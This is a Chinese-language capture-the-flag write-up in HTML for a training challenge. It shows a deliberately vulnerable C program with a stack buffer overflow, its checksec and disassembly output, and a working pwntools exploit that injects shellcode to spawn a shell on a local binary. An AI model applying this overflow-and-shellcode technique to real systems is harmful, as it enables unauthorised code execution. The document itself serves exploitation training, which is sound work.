@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>PwnMe-challenges-train-sniper-02 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">PwnMe-challenges-train-sniper-02</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1683253847460"
+                  >2023</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1684230457849"
+                  >2023</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p><strong>漏洞程序源码如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{
+        <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x50</span>] = {<span class="hljs-number">0</span>}; <span class="hljs-comment">// 定义一个 0x50 = 80 个字节的字符数组 , 并全部初始化为 0 </span>
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&amp;buffer = %p\n"</span>, &amp;buffer); <span class="hljs-comment">// 打印字符数组在内存(栈段)中的地址</span>
+        fflush(<span class="hljs-built_in">stdout</span>); <span class="hljs-comment">// 刷新缓冲区</span>
+        read(<span class="hljs-number">0</span>, buffer, <span class="hljs-number">0xFF</span>); <span class="hljs-comment">// 使用 read 函数将缓冲区中的 0xFF 字节长度的数据读取到 buffer 数组中 , 以换行符结束</span>
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of buffer : %s\n"</span>, buffer); <span class="hljs-comment">// 打印 buffer 的值</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 主函数返回</span>
+}</code></pre></div>
+<p><strong>编译选项如下：</strong></p>
+<div><pre class="hljs"><code>a.out:hello.c
+        gcc -g -fno-<span class="hljs-built_in">stack</span>-protector -z execstack hello.c
+clean:
+        rm ./a.out</code></pre></div>
+<p><strong>checksec</strong></p>
+<div><pre class="hljs"><code>└─$ checksec --<span class="hljs-keyword">file</span>=a.<span class="hljs-keyword">out</span>
+RELRO           <span class="hljs-keyword">STACK</span> CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified    Fortifiable      <span class="hljs-keyword">FILE</span>
+Partial RELRO   <span class="hljs-keyword">No</span> canary found   NX disabled   <span class="hljs-keyword">No</span> PIE          <span class="hljs-keyword">No</span> RPATH   <span class="hljs-keyword">No</span> RUNPATH   75 Symbols        <span class="hljs-keyword">No</span>    0            2a.<span class="hljs-keyword">out</span></code></pre></div>
+<p><strong>objdump</strong></p>
+<div><pre class="hljs"><code>└─$ objdump -t -j .text a.out 
+
+a.out:     file format elf64-x86-64
+
+SYMBOL TABLE:
+0000000000400500 l    d  .text  0000000000000000              .text
+0000000000400530 l     F .text  0000000000000000              deregister_tm_clones
+0000000000400560 l     F .text  0000000000000000              register_tm_clones
+00000000004005a0 l     F .text  0000000000000000              __do_global_dtors_aux
+00000000004005c0 l     F .text  0000000000000000              frame_dummy
+00000000004006e0 g     F .text  0000000000000002              __libc_csu_fini
+0000000000400670 g     F .text  0000000000000065              __libc_csu_init
+0000000000400500 g     F .text  000000000000002a              _start
+00000000004005ed g     F .text  0000000000000077              main</code></pre></div>
+<p><strong>运行程序</strong></p>
+<div><pre class="hljs"><code>└─$ ./a.out 
+&amp;buffer = 0x7ffddf5e9f70
+<span class="hljs-built_in">test</span>
+Content of buffer : <span class="hljs-built_in">test</span></code></pre></div>
+<p><strong>查看其反编译代码</strong></p>
+<div><pre class="hljs"><code>undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    <span class="hljs-type">int64_t</span> iVar1;
+    undefined8 *puVar2;
+    <span class="hljs-type">char</span> buffer [<span class="hljs-number">80</span>];
+    
+    <span class="hljs-comment">// int main();</span>
+    puVar2 = (undefined8 *)buffer;
+    <span class="hljs-keyword">for</span> (iVar1 = <span class="hljs-number">10</span>; iVar1 != <span class="hljs-number">0</span>; iVar1 = iVar1 + <span class="hljs-number">-1</span>) {
+        *puVar2 = <span class="hljs-number">0</span>;
+        puVar2 = puVar2 + <span class="hljs-number">1</span>;
+    }
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&amp;buffer = %p\n"</span>, buffer);
+    fflush(_stdout);
+    read(<span class="hljs-number">0</span>, buffer, <span class="hljs-number">0xff</span>);
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of buffer : %s\n"</span>, buffer);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre></div>
+<p><strong>分析如下，这个程序主要是将输入的数据从缓冲区复制给buffer变量，由于read并未限制读取，我们可以输入一段shellcode将其复制到buffer中，并在输入的shellcode后添加足够长度的数据使其可以覆盖到返回值，将返回值修改指向到buffer变量，从而可以执行我们写入的shellcode，示意图如下：</strong></p>
+<p><strong><img src="/_resources/dc7a9e2e10c8499bb5ea78d40eafb8f2.png" alt="16b4fc6ffa60561271c4511a9606cf6c.png" width="566" height="428" class="jop-noMdConv" /></strong></p>
+<p><strong>buffer变量长度为80，ebp长度为8，长度一共为88</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span>
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python">shellcode = asm(shellcraft.sh())</span>
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(shellcode)</span>
+b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
+<span class="hljs-meta">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(shellcode)</span>
+44</code></pre></div>
+<p><strong>shellcode的长度为44,那么88-44=44,所以还需要44字节的填充数据</strong></p>
+<p><strong>Exp如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+io = process(<span class="hljs-string">'./a.out'</span>)
+
+addr  = io.recvline(keepends=<span class="hljs-literal">False</span>)
+addr  = addr[<span class="hljs-number">10</span>:-<span class="hljs-number">1</span>]
+addr  = addr.decode()
+addr = <span class="hljs-built_in">int</span>(addr,<span class="hljs-number">16</span>)
+
+shellcode = asm(shellcraft.sh())
+
+io.sendline(shellcode + <span class="hljs-string">b'a'</span>*<span class="hljs-number">44</span> +p64(addr))
+io.interactive()</code></pre></div>
+<p><img src="/_resources/ba8b2f18869d48ea8138572ce9045636.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
